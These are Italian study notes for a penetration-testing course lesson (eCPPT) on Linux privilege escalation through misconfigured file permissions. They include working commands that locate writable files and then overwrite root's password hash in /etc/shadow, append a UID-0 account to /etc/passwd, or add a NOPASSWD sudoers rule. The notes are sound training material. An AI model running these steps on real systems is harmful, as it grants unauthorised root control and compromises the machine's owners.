# 015 — Misconfigured File Permissions (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 15/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [015_Misconfigured File Permissions.txt](015_Misconfigured File Permissions.txt) · [015_Misconfigured File Permissions.srt](015_Misconfigured File Permissions.srt)

## Concetti chiave

- Inizio della sezione **Linux Privilege Escalation**. Punto di partenza: utente non privilegiato `student` su sistema già compromesso, obiettivo = `root`.
- **Misconfigured file permissions** = file di sistema sensibili (auth, config, script eseguiti da root) con permessi troppo permissivi (writable da utenti non root o readable quando non dovrebbero esserlo).
- Esempio lampante del lab: **`/etc/shadow` writable da tutti gli utenti** → si può sostituire l'hash della password di `root` con uno noto e fare `su root`.
- Tool di rilevamento principale: `find` con flag di permessi (`-perm -o+w`, `-writable`, `-perm -222`).
- **Differenza chiave**:
  - `/etc/passwd` → world-readable (normale), **non** world-writable.
  - `/etc/shadow` → **solo `root` può leggere/scrivere** (default `640 root:shadow`). Se è scrivibile da `student`, è una misconfiguration grave.

## Spiegazione approfondita

### Tecnica del lab — Reset hash di `root` in `/etc/shadow`

Flusso step-by-step come mostrato nel video:

1. **Discovery file scrivibili dal nostro utente** partendo dalla radice del filesystem:
   ```bash
   find / -not -type l -perm -o+w 2>/dev/null
   ```
   Output include `/etc/shadow` (red flag).
2. **Verifica permessi** del file sospetto:
   ```bash
   ls -al /etc/shadow
   # -rw-rw-rw- 1 root shadow ...  ← world rw, errore di config
   ```
3. **Lettura del contenuto** (normalmente impossibile, qui sì):
   ```bash
   cat /etc/shadow
   ```
   Si nota che alcuni utenti hanno `*` o `!` al posto dell'hash (account senza password locale): si può iniettare un hash di nostra scelta.
4. **Generazione hash compatibile con `/etc/shadow`**:
   ```bash
   openssl passwd -1 -salt abc password
   # $1$abc$...   ← hash MD5 crypt con salt "abc"
   ```
   Il formato `$1$` è MD5; va bene anche `-6` per SHA-512 (`$6$...`), formato moderno.
5. **Edit di `/etc/shadow`** con `vim` (abbiamo write). Sostituisci il secondo campo della riga di `root` (separatore `:`) con l'hash generato:
   ```
   root:$1$abc$XYZ...:19000:0:99999:7:::
   ```
6. **Switch user**:
   ```bash
   su root
   # password: password   → # whoami → root
   ```

### Varianti dello stesso pattern (non eseguite ma fondamentali per l'esame)

- **`/etc/passwd` writable** (caso classico): aggiungere una riga con UID 0 e password nota:
  ```bash
  openssl passwd -1 -salt abc password           # $1$abc$XYZ...
  echo 'r00t:$1$abc$XYZ...:0:0:root:/root:/bin/bash' >> /etc/passwd
  su r00t                                         # root shell
  ```
  Funziona perché `/etc/passwd` può ancora contenere hash in **campo 2** (legacy) e Linux accetta UID 0 = root.
- **`/etc/sudoers` writable** (raro): aggiungere `student ALL=(ALL) NOPASSWD: ALL` e poi `sudo -i`.
- **Script o cron job di root scrivibili**: iniettare comandi nel file → al prossimo run, eseguono come root.
- **Backup files** (`.bak`, `~`) con permessi laschi che rivelano credenziali.

### Comandi `find` essenziali

| Comando | Cosa cerca |
|---|---|
| `find / -not -type l -perm -o+w 2>/dev/null` | File world-writable (no symlink) — quello del video |
| `find / -writable -type f 2>/dev/null` | File scrivibili dal current user (più accurato di -perm) |
| `find / -perm -222 -type f 2>/dev/null` | Equivalente classico world-writable |
| `find / -perm -o+w -type d 2>/dev/null` | **Directory** world-writable (target per drop/replace) |
| `find / -perm -u=s -type f 2>/dev/null` | File con SUID set (vedi video 016) |
| `find / -readable -name shadow 2>/dev/null` | Vede /etc/shadow se readable |

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `find / -not -type l -perm -o+w 2>/dev/null` | Discovery file scrivibili dal mondo | Comando esatto del video |
| `ls -al <file>` | Verifica ownership + bit di permesso | |
| `cat /etc/shadow` | Lettura hash (se readable) | Normalmente fallisce per non-root |
| `openssl passwd -1 -salt <salt> <password>` | Genera hash MD5-crypt per `/etc/shadow` | `-6` per SHA-512 (moderno) |
| `openssl passwd -6 -salt xyz password` | Versione SHA-512 dell'hash | Più "credibile" su sistemi recenti |
| `vim /etc/shadow` | Edit dell'hash di root | `:wq!` per forzare se file flagged read-only |
| `su root` | Switch a root usando nuova password | Conferma exploit |
| `id` / `whoami` | Verifica privilege escalation | |
| **LinPEAS / linpeas.sh** | Script automatico — sezione *Interesting writable files* | Strumento di scelta in pentest reale |
| **linux-exploit-suggester** | Suggerisce exploit kernel/local | Complementare |

## Esempi pratici

```bash
# 1. Enum permessi scrivibili
find / -not -type l -perm -o+w 2>/dev/null | grep -v "/proc\|/sys"

# 2. Verifica shadow
ls -al /etc/shadow
# -rw-rw-rw- 1 root shadow → exploit possibile

# 3. Genera hash
openssl passwd -1 -salt abc password
# $1$abc$E5VPGgmnxIRVfTKwANS.10

# 4. Edit shadow → sostituisci campo password di root
vim /etc/shadow
# root:$1$abc$E5VPGgmnxIRVfTKwANS.10:19000:0:99999:7:::

# 5. Login come root
su root
# Password: password
whoami   # root
```

```bash
# Variante /etc/passwd writable
openssl passwd -1 -salt xyz P@ssw0rd
echo 'pwn:$1$xyz$....:0:0::/root:/bin/bash' >> /etc/passwd
su pwn        # UID 0 → root shell
```

## Punti d'attenzione per l'esame eCPPT

- **Memorizza il comando `find` di discovery**: `find / -writable -type f 2>/dev/null` (o varianti con `-perm -o+w` / `-perm -222`).
- **`/etc/shadow` writable** e **`/etc/passwd` writable** sono i due casi-scuola: sai come exploitare entrambi.
  - `/etc/shadow`: sostituisci hash root → `su root`.
  - `/etc/passwd`: aggiungi user con UID 0 e password hash → `su <user>`.
- **`openssl passwd -1`** (MD5) e **`-6`** (SHA-512): il prefisso dell'hash (`$1$`, `$6$`) deve matchare formato accettato dal sistema.
- **UID 0 = root**: qualsiasi user account con UID 0 è root, indipendentemente dal nome.
- Su un sistema reale, controlla anche: **script in cron eseguiti da root e scrivibili**, file in `/etc/cron.d/`, `/etc/init.d/`, configuration files dei servizi.
- **Salt** in `openssl passwd`: nel video si usa `abc` per semplicità — qualsiasi stringa va bene, il sistema accetta il salt scritto nell'hash.
- Differenza con `/etc/passwd` storico: oggi gli hash sono in `/etc/shadow`, ma se trovi un hash in `/etc/passwd` campo 2, è ancora valido (compatibilità legacy).

## Collegamenti con altri video

- Precedente: [[014_Locally Stored Credentials]] — primo step di Linux PrivEsc (credenziali in file di config).
- Prossimo: [[016_Exploiting SUID Binaries]] — altra classe di misconfig (bit SUID).
- Pattern correlato Windows: [[08_Exploiting Insecure Service Permissions]] — file/servizio scrivibili.
- Strumento automatico complementare: **LinPEAS** (`linpeas.sh`) — sezione "Interesting writable files".
- MITRE ATT&CK: T1222.002 (Linux File Permissions Modification), T1548.003 (Sudo and Sudo Caching).
